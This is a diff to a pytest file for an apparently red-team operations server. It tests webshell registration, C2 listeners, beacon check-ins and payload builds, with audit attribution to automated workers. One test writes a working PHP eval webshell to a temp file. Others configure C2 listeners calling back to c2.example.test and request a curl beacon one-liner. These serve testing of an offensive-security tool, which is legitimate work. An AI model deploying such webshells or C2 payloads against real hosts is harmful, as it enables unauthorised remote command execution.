@@ -16,6 +16,7 @@ from fastapi.testclient import TestClient
 from redtrace.server import db
 from redtrace.server.app import app
 from redtrace.server import operations
+from redtrace.server.routers import operations as operations_router
 
 
 def _php_runtime_available() -> bool:
@@ -108,6 +109,11 @@ def test_worker_registers_webshell_without_exposing_secret_and_reuses_it(
     )
     assert queued.status_code == 202
     operation_id = queued.json()["task"]["id"]
+    direct = client.get(
+        f"/projects/{project_id}/operations/tasks/{operation_id}"
+    )
+    assert direct.status_code == 200
+    assert direct.json()["task"]["id"] == operation_id
     for _ in range(50):
         tasks = client.get(f"/projects/{project_id}/operations/tasks").json()["tasks"]
         task = next(item for item in tasks if item["id"] == operation_id)
@@ -167,6 +173,17 @@ def test_simple_php_eval_webshell_can_be_tested_and_reused(
     client: TestClient,
     tmp_path: Path,
 ) -> None:
+    target_os = "windows" if shutil.which("powershell") else "linux"
+    if target_os == "linux":
+        find_probe = subprocess.run(
+            ["find", str(tmp_path), "-maxdepth", "0", "-printf", ""],
+            check=False,
+            capture_output=True,
+            text=True,
+        )
+        if find_probe.returncode:
+            pytest.skip("the WebShell Linux file-manager test requires GNU find")
+
     demo = tmp_path / "shell.php"
     demo.write_text("<?php  @eval($_POST['cmd']);  ?>", encoding="utf-8")
     with socket.socket() as server_socket:
@@ -198,7 +215,7 @@ def test_simple_php_eval_webshell_can_be_tested_and_reused(
                 "protocol": "eval",
                 "method": "POST",
                 "command_param": "cmd",
-                "target_os": "windows",
+                "target_os": target_os,
                 "encoding": "utf-8",
             },
         )
@@ -216,7 +233,7 @@ def test_simple_php_eval_webshell_can_be_tested_and_reused(
                     "protocol": "eval",
                     "method": "POST",
                     "command_param": "cmd",
-                    "os": "windows",
+                    "os": target_os,
                     "encoding": "utf-8",
                     "verify_tls": False,
                 },
@@ -490,6 +507,150 @@ def test_c2_payload_and_profile_are_project_scoped_references(client: TestClient
     facts = client.get(f"/projects/{project_id}").json()["facts"]
     assert any("C2 载荷" in fact["description"] for fact in facts)
     assert any("C2 流量伪装" in fact["description"] for fact in facts)
+
+
+def test_worker_snapshot_and_changes_reveal_human_webshell_and_c2_session(
+    client: TestClient,
+) -> None:
+    project_id = create_project(client)
+    listener_response = client.post(
+        f"/projects/{project_id}/resources",
+        json={
+            "kind": "c2_listener",
+            "name": "人工 Listener",
+            "target": "0.0.0.0:8443",
+            "status": "available",
+            "metadata": {
+                "listener_type": "http_beacon",
+                "bind_host": "0.0.0.0",
+                "bind_port": 8443,
+                "callback_host": "c2.example.test",
+            },
+        },
+    )
+    listener = listener_response.json()["resource"]
+    listener_token = listener_response.json()["secret_once"]
+    worker_headers = {
+        "X-RedTrace-Worker": "codex-1",
+        "X-RedTrace-Task": "explore",
+        "X-RedTrace-Intent": "i001",
+    }
+
+    snapshot = client.get(
+        f"/projects/{project_id}/operations/snapshot",
+        headers=worker_headers,
+        params={"kinds": "webshell,c2_listener,c2_session,c2_payload"},
+    )
+    assert snapshot.status_code == 200
+    snapshot_payload = snapshot.json()
+    assert snapshot_payload["audit_cursor"] > 0
+    assert [resource["id"] for resource in snapshot_payload["resources"]] == [listener["id"]]
+
+    shell = client.post(
+        f"/projects/{project_id}/resources",
+        json={
+            "kind": "webshell",
+            "name": "人工新增 Shell",
+            "target": "https://target.test/shell.php",
+            "metadata": {"method": "POST", "command_param": "cmd"},
+            "secret": {"password": "hidden"},
+        },
+    ).json()["resource"]
+    checkin = client.post(
+        f"/c2/checkin/{listener['id']}",
+        headers={"X-RedTrace-Listener-Token": listener_token},
+        json={
+            "external_id": "human-added-host",
+            "hostname": "human-added-host",
+            "username": "operator",
+            "os": "linux",
+            "arch": "amd64",
+            "capabilities": ["command"],
+        },
+    )
+    assert checkin.status_code == 200
+
+    changes_payload = client.get(
+        f"/projects/{project_id}/operations/audit",
+        params={"since": snapshot_payload["audit_cursor"]},
+    ).json()
+    assert changes_payload["audit_cursor"] > snapshot_payload["audit_cursor"]
+    changes = changes_payload["events"]
+    assert any(
+        event["action"] == "resource.register" and event["resource_id"] == shell["id"]
+        for event in changes
+    )
+    assert any(
+        event["action"] == "c2.session_online"
+        and event["resource_id"] == checkin.json()["session_id"]
+        for event in changes
+    )
+
+
+def test_worker_builds_payload_with_worker_and_intent_attribution(
+    client: TestClient,
+    monkeypatch,
+    tmp_path: Path,
+) -> None:
+    project_id = create_project(client)
+    listener = client.post(
+        f"/projects/{project_id}/resources",
+        json={
+            "kind": "c2_listener",
+            "name": "HTTP Beacon",
+            "target": "0.0.0.0:8443",
+            "status": "available",
+            "metadata": {
+                "listener_type": "http_beacon",
+                "bind_host": "0.0.0.0",
+                "bind_port": 8443,
+                "callback_host": "c2.example.test",
+            },
+        },
+    ).json()["resource"]
+
+    def fake_build_beacon(**_: object) -> Path:
+        artifact = tmp_path / "worker-beacon"
+        artifact.write_bytes(b"compiled")
+        return artifact
+
+    monkeypatch.setattr(operations_router, "build_beacon", fake_build_beacon)
+    headers = {
+        "X-RedTrace-Worker": "pi-1",
+        "X-RedTrace-Task": "explore",
+        "X-RedTrace-Intent": "i007",
+    }
+    oneliner = client.post(
+        f"/projects/{project_id}/c2/payloads/oneliner",
+        headers=headers,
+        json={"listener_id": listener["id"], "kind": "curl_beacon"},
+    )
+    assert oneliner.status_code == 200
+    assert f"/c2/checkin/{listener['id']}" in oneliner.json()["oneliner"]
+    built = client.post(
+        f"/projects/{project_id}/c2/payloads/build",
+        headers=headers,
+        json={
+            "listener_id": listener["id"],
+            "callback_url": "https://c2.example.test:8443",
+            "os": "linux",
+            "arch": "amd64",
+        },
+    )
+    assert built.status_code == 201
+    payload = built.json()["payload"]
+    assert payload["created_by_type"] == "worker"
+    assert payload["created_by"] == "pi-1"
+    assert payload["worker"] == "pi-1"
+    assert payload["intent_id"] == "i007"
+    audit = client.get(f"/projects/{project_id}/operations/audit").json()["events"]
+    build_event = next(event for event in audit if event["action"] == "c2.payload_build")
+    assert build_event["actor_type"] == "worker"
+    assert build_event["actor"] == "pi-1"
+    assert build_event["detail"]["intent_id"] == "i007"
+    oneliner_event = next(event for event in audit if event["action"] == "c2.payload_oneliner")
+    assert oneliner_event["actor_type"] == "worker"
+    assert oneliner_event["actor"] == "pi-1"
 
 
 def test_human_can_pause_lock_cancel_and_audit_worker_operations(client: TestClient) -> None:
